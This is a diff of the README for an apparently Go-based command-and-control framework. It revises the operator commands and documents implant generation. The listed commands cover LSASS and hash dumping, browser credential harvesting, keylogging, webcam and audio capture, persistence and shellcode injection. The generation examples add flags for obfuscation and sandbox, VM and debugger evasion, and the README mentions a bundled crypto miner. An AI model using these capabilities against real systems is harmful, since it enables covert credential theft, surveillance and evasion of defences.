@@ -68,14 +68,18 @@ make build
 make run-server
 ```
 
-**Terminal 2 - Implant:**
-```bash
-make run-client
-```
-
-**Terminal 3 - Operator Console:**
+**Terminal 2 - Operator Console:**
 ```bash
 make run-console
+```
+
+**Terminal 3 - Generate and Run Implant:**
+```bash
+# In the console, generate an implant
+generate --mtls <server-address> --os <target-os> --arch <target-arch>
+
+# Run the generated implant binary
+./path/to/generated/implant
 ```
 
 For detailed setup and manual execution options, see the [documentation](docs/).
@@ -87,40 +91,45 @@ For detailed setup and manual execution options, see the [documentation](docs/).
 ```bash
 # Session management
 sessions                    # List all sessions
-session <id>               # Interact with session
+use <id>                   # Enter interactive session mode
+session <id>               # Alias for 'use'
 kill <id>                  # Terminate session
 
-# Command execution
-shell <command>            # Execute command
-pty [shell]               # Interactive PTY shell
+# Command execution (in session mode)
+shell [command]            # Execute command or start interactive PTY
 upload <local> <remote>    # Upload file
-download <remote> [local]  # Download file
+download <remote> <local>  # Download file
 
-# Post-exploitation
+# Post-exploitation (in session mode)
 execute-assembly <path> [args]           # .NET assembly execution
 execute-pe <path> [args]                 # PE/DLL via Donut
 execute-bof <path> [args]                # BOF execution (Win x64)
-execute-shellcode -m <method> <file>     # Shellcode injection
+execute-shellcode <file>                 # Shellcode injection
 migrate <pid>                            # Process migration
 
-# Credentials
-dump-lsass                  # LSASS dump
-hashdump                   # Hash extraction
-harvest-all-browsers       # Browser credentials
+# Credentials (in session mode)
+lsass                      # LSASS dump (Windows)
+hashdump                   # Hash extraction (SAM/shadow)
+harvest <chrome|firefox|edge|all>        # Browser credentials
 
-# Surveillance
-keylog-start / keylog-stop
-screenshot
-audio-capture <seconds>
-webcam-capture <seconds> <format>
+# Surveillance (in session mode)
+keylog start               # Start keylogger
+keylog stop                # Stop keylogger
+screenshot                 # Capture screenshot
+audio [duration]           # Record audio (default: 5s)
+webcam <photo|video> [duration]          # Capture from webcam
 
-# Networking
-socks-start [port]
-portfwd-add <bind> <host> <port>
+# Networking (in session mode)
+socks start [port]         # Start SOCKS5 proxy
+socks stop                 # Stop SOCKS5 proxy
+portfwd add <bind> <host> <port>         # Add port forward
+portfwd remove <bind>      # Remove port forward
+portfwd list               # List port forwards
 
-# Persistence
-persist-install <method>    # registry, task, service, cron, systemd, launchd
-persist-remove <method>
+# Persistence (in session mode)
+persist install <method>   # Install persistence (registry, task, service, cron, systemd, launchd)
+persist remove <method>    # Remove persistence
+persist list               # List persistence methods
 ```
 
 For complete command reference and advanced options, see the [operator guide](docs/OPERATOR_GUIDE.md).
@@ -155,6 +164,7 @@ For complete command reference and advanced options, see the [operator guide](do
 ## Advanced Capabilities
 
 ### Implant Generation
+Implants are generated via the console CLI using templating to inject custom configurations:
 - Cross-platform compilation (Windows, Linux, macOS)
 - Custom configurations (beacon interval, jitter, kill date, evasion level)
 - Per-implant TLS certificates
@@ -178,21 +188,45 @@ Extensible module system with built-in XMRig cryptocurrency miner. Custom module
 
 ## Development
 
-### Build Options
+### Implant Generation
+
+Implants are generated using the console CLI, which uses templating to customize the implant code based on your configuration:
 
 ```bash
-# Cross-platform compilation
-GOOS=windows GOARCH=amd64 go build -o implant.exe ./implant
-GOOS=linux GOARCH=amd64 go build -o implant-linux ./implant
-GOOS=darwin GOARCH=arm64 go build -o implant-macos-arm ./implant
+# In the operator console
+generate [transport] [options]
 
-# With obfuscation (requires garble)
-make tools
-garble -literals -tiny build -o bin/obfuscated-implant ./implant
+# Basic examples:
+generate --mtls 192.168.1.100:8443
+generate --https example.com:443 --os windows --arch amd64
+generate --http 10.0.0.1:80 --format dll --evasion --garble
 
-# Optimize binary size
-go build -ldflags="-s -w" -trimpath -o implant ./implant
+# Advanced obfuscation:
+generate --mtls 10.0.0.1:8443 --obf-level 3
+generate --https cdn.example.com:443 --preset-heavy
+generate --mtls 10.0.0.1:8443 --string-obf --api-obf --sandbox-evasion
 ```
+
+**Transport Options:**
+- `--mtls <address>` - mTLS transport (default)
+- `--http <address>` - HTTP transport
+- `--https <address>` - HTTPS transport
+- `--dns <domain>` - DNS transport
+
+**Build Options:**
+- `--os, -o <os>` - Target OS (windows, linux, darwin)
+- `--arch, -a <arch>` - Target architecture (amd64, 386, arm64)
+- `--format, -f <fmt>` - Output format (exe, dll, shellcode, service, source)
+- `--save, -s <dir>` - Save to directory (default: ./)
+
+**Obfuscation & Evasion:**
+- `--evasion, -e` - Enable basic evasion techniques
+- `--garble, -g` - Use garble for code obfuscation
+- `--obf-level <0-4>` - Obfuscation level
+- `--preset-light|medium|heavy|extreme` - Quick presets
+- `--anti-vm`, `--anti-debug`, `--sandbox-evasion` - Advanced evasion
+
+The console applies configuration templates to the implant source code and compiles the customized binary for the target platform.
 
 ### Extending Functionality
 
